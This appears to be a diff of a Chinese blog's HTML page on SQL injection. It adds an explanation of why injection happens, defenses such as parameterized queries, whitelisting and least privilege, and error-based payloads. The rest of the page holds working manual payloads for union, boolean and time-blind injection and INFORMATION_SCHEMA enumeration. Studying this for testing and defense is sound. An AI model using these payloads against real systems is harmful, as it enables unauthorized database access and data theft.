@@ -6,16 +6,17 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="Enil ">
-<meta name="description" content="手工注入 简单的注入 当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。
+<meta name="description" content="SQL 注入原理 SQL 注入的根本原因是代码与数据的混淆：应用程序把用户输入直接拼接进了 SQL 语句，而数据库无法区分 “哪些是开发者写好的指令、哪些是用户传进来的数据”，于是把用户输入也当成 SQL 代码的一部分解析执行。
+例如：
+SELECT * FROM users WHERE name = &#39;$input&#39; 正常情况下 $input 是一个用户名。如果传入 OR 1=1，拼出来就变成 WHERE name = &#39;&#39; OR 1=1 恒为真，整张表都被返回。这里的用户输入的单引号逃逸了数据的范围，闭合掉前面的引号，后面的内容就被当成了 SQL 逻辑。
+按是否回显能分为回显注入（union 联合查询、报错注入）和盲注（页面不回显数据，靠布尔真假或时间延迟一位一位地猜，还有带外/DNS注入）；按注入点位置可以分为 GET/POST/Cookie/Header 等参数。
+防御上可以使用预编译/参数化查询。参数化把 SQL 语句地结构先编译固定下来，用户数据是之后再作为纯数据绑定进去的。这样无论用户传什么，永远只能是数据，不可能改变查询结构。结构先编译，数据后绑定。
+白名单校验，限定只能是预先允许的几个值，而不是去过滤特殊字符。
+最小限原则，只给业务必须的权限，不给 DROP、不给跨库读、关闭文件的读写权限
+手工注入 简单的注入 当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。
 &#39; or 1=1 -- - 探测 Columns 确认有 sql 注入漏洞后可使用 order by 或 group by 探测 Columns。 `
 &#39; order by 3 -- - 联合查询 使用 union 进一步探测信息。
 探测显示数据的位置，这里假设为 3。
-&#39; union select 1,2,3 -- - 探测数据库的版本。
-&#39; union select 1,2,version() -- - 探测数据库名称。
-&#39; union select 1,2,database() -- - 探测用户名称。
-&#39; union select 1,2,user() -- - 探测 Tables 表。
-&#39; union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- - 探测 Tables 名。
-&#39; union select 1,2,table_name from INFORMATION_SCHEMA.tables -- - 探测 Columns 表。
 " />
 <meta name="keywords" content=", Hack" />
 <meta name="robots" content="noodp" />
@@ -50,33 +51,35 @@
 
 
   <meta itemprop="name" content="SQL 注入精要">
-  <meta itemprop="description" content="手工注入 简单的注入 当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。
+  <meta itemprop="description" content="SQL 注入原理 SQL 注入的根本原因是代码与数据的混淆：应用程序把用户输入直接拼接进了 SQL 语句，而数据库无法区分 “哪些是开发者写好的指令、哪些是用户传进来的数据”，于是把用户输入也当成 SQL 代码的一部分解析执行。
+例如：
+SELECT * FROM users WHERE name = &#39;$input&#39; 正常情况下 $input 是一个用户名。如果传入 OR 1=1，拼出来就变成 WHERE name = &#39;&#39; OR 1=1 恒为真，整张表都被返回。这里的用户输入的单引号逃逸了数据的范围，闭合掉前面的引号，后面的内容就被当成了 SQL 逻辑。
+按是否回显能分为回显注入（union 联合查询、报错注入）和盲注（页面不回显数据，靠布尔真假或时间延迟一位一位地猜，还有带外/DNS注入）；按注入点位置可以分为 GET/POST/Cookie/Header 等参数。
+防御上可以使用预编译/参数化查询。参数化把 SQL 语句地结构先编译固定下来，用户数据是之后再作为纯数据绑定进去的。这样无论用户传什么，永远只能是数据，不可能改变查询结构。结构先编译，数据后绑定。
+白名单校验，限定只能是预先允许的几个值，而不是去过滤特殊字符。
+最小限原则，只给业务必须的权限，不给 DROP、不给跨库读、关闭文件的读写权限
+手工注入 简单的注入 当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。
 &#39; or 1=1 -- - 探测 Columns 确认有 sql 注入漏洞后可使用 order by 或 group by 探测 Columns。 `
 &#39; order by 3 -- - 联合查询 使用 union 进一步探测信息。
-探测显示数据的位置，这里假设为 3。
-&#39; union select 1,2,3 -- - 探测数据库的版本。
-&#39; union select 1,2,version() -- - 探测数据库名称。
-&#39; union select 1,2,database() -- - 探测用户名称。
-&#39; union select 1,2,user() -- - 探测 Tables 表。
-&#39; union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- - 探测 Tables 名。
-&#39; union select 1,2,table_name from INFORMATION_SCHEMA.tables -- - 探测 Columns 表。">
+探测显示数据的位置，这里假设为 3。">
   <meta itemprop="datePublished" content="2026-03-21T15:00:00+08:00">
   <meta itemprop="dateModified" content="2026-03-21T15:00:00+08:00">
-  <meta itemprop="wordCount" content="1554">
+  <meta itemprop="wordCount" content="1608">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="SQL 注入精要">
-  <meta name="twitter:description" content="手工注入 简单的注入 当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。
+  <meta name="twitter:description" content="SQL 注入原理 SQL 注入的根本原因是代码与数据的混淆：应用程序把用户输入直接拼接进了 SQL 语句，而数据库无法区分 “哪些是开发者写好的指令、哪些是用户传进来的数据”，于是把用户输入也当成 SQL 代码的一部分解析执行。
+例如：
+SELECT * FROM users WHERE name = &#39;$input&#39; 正常情况下 $input 是一个用户名。如果传入 OR 1=1，拼出来就变成 WHERE name = &#39;&#39; OR 1=1 恒为真，整张表都被返回。这里的用户输入的单引号逃逸了数据的范围，闭合掉前面的引号，后面的内容就被当成了 SQL 逻辑。
+按是否回显能分为回显注入（union 联合查询、报错注入）和盲注（页面不回显数据，靠布尔真假或时间延迟一位一位地猜，还有带外/DNS注入）；按注入点位置可以分为 GET/POST/Cookie/Header 等参数。
+防御上可以使用预编译/参数化查询。参数化把 SQL 语句地结构先编译固定下来，用户数据是之后再作为纯数据绑定进去的。这样无论用户传什么，永远只能是数据，不可能改变查询结构。结构先编译，数据后绑定。
+白名单校验，限定只能是预先允许的几个值，而不是去过滤特殊字符。
+最小限原则，只给业务必须的权限，不给 DROP、不给跨库读、关闭文件的读写权限
+手工注入 简单的注入 当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。
 &#39; or 1=1 -- - 探测 Columns 确认有 sql 注入漏洞后可使用 order by 或 group by 探测 Columns。 `
 &#39; order by 3 -- - 联合查询 使用 union 进一步探测信息。
-探测显示数据的位置，这里假设为 3。
-&#39; union select 1,2,3 -- - 探测数据库的版本。
-&#39; union select 1,2,version() -- - 探测数据库名称。
-&#39; union select 1,2,database() -- - 探测用户名称。
-&#39; union select 1,2,user() -- - 探测 Tables 表。
-&#39; union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- - 探测 Tables 名。
-&#39; union select 1,2,table_name from INFORMATION_SCHEMA.tables -- - 探测 Columns 表。">
+探测显示数据的位置，这里假设为 3。">
 
 
 
@@ -159,6 +162,7 @@
                 <div class="toc-title">Table of Contents</div>
                     <nav id="TableOfContents">
   <ul>
+    <li><a href="#sql-注入原理">SQL 注入原理</a></li>
     <li><a href="#手工注入">手工注入</a>
       <ul>
         <li><a href="#简单的注入">简单的注入</a></li>
@@ -167,6 +171,7 @@
         <li><a href="#复合-union-查询">复合 union 查询</a></li>
         <li><a href="#boolean-盲注">Boolean 盲注</a></li>
         <li><a href="#time-盲注">Time 盲注</a></li>
+        <li><a href="#报错注入">报错注入</a></li>
       </ul>
     </li>
     <li><a href="#sqlmap-自动注入">Sqlmap 自动注入</a>
@@ -194,7 +199,16 @@
             
 
             <div class="post-content">
-                <h2 id="手工注入">手工注入</h2>
+                <h2 id="sql-注入原理">SQL 注入原理</h2>
+<p>SQL 注入的根本原因是代码与数据的混淆：应用程序把用户输入直接拼接进了 SQL 语句，而数据库无法区分 “哪些是开发者写好的指令、哪些是用户传进来的数据”，于是把用户输入也当成 SQL 代码的一部分解析执行。</p>
+<p>例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$input&#39;</span>
+</span></span></code></pre></div><p>正常情况下 <code>$input</code> 是一个用户名。如果传入 <code> OR 1=1</code>，拼出来就变成 <code>WHERE name = '' OR 1=1</code> 恒为真，整张表都被返回。这里的用户输入的单引号逃逸了数据的范围，闭合掉前面的引号，后面的内容就被当成了 SQL 逻辑。</p>
+<p>按是否回显能分为回显注入（union 联合查询、报错注入）和盲注（页面不回显数据，靠布尔真假或时间延迟一位一位地猜，还有带外/DNS注入）；按注入点位置可以分为 GET/POST/Cookie/Header 等参数。</p>
+<p>防御上可以使用预编译/参数化查询。参数化把 SQL 语句地结构先编译固定下来，用户数据是之后再作为纯数据绑定进去的。这样无论用户传什么，永远只能是数据，不可能改变查询结构。结构先编译，数据后绑定。</p>
+<p>白名单校验，限定只能是预先允许的几个值，而不是去过滤特殊字符。</p>
+<p>最小限原则，只给业务必须的权限，不给 DROP、不给跨库读、关闭文件的读写权限</p>
+<h2 id="手工注入">手工注入</h2>
 <h3 id="简单的注入">简单的注入</h3>
 <p>当获得一个登入框时可以尝试使用最简单的语句尝试是否存在 sql 注入漏洞。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -- -
@@ -247,6 +261,11 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> and sleep<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span> -- -
 </span></span></code></pre></div><p>判断数据库名称长度。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> and <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>length<span style="color:#f92672">(</span>database<span style="color:#f92672">())</span> <span style="color:#f92672">=</span> 8,sleep<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>,0<span style="color:#f92672">)</span> -- -
+</span></span></code></pre></div><h3 id="报错注入">报错注入</h3>
+<h4 id="updatexml">updatexml()</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>updatexml<span style="color:#f92672">(</span>1, concat<span style="color:#f92672">(</span>0x7e, <span style="color:#f92672">(</span><span style="color:#66d9ef">select</span> user<span style="color:#f92672">()))</span>, 1<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="extractvalue">extractvalue()</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>extractvalue<span style="color:#f92672">(</span>1, concat<span style="color:#f92672">(</span>0x7e, <span style="color:#f92672">(</span><span style="color:#66d9ef">select</span> database<span style="color:#f92672">())))</span>
 </span></span></code></pre></div><h2 id="sqlmap-自动注入">Sqlmap 自动注入</h2>
 <h3 id="常用注入流程">常用注入流程</h3>
 <p>使用 sqlmap 探测数据库信息，强度为 level 3，level 默认为 1，数字越大强度越高。</p>
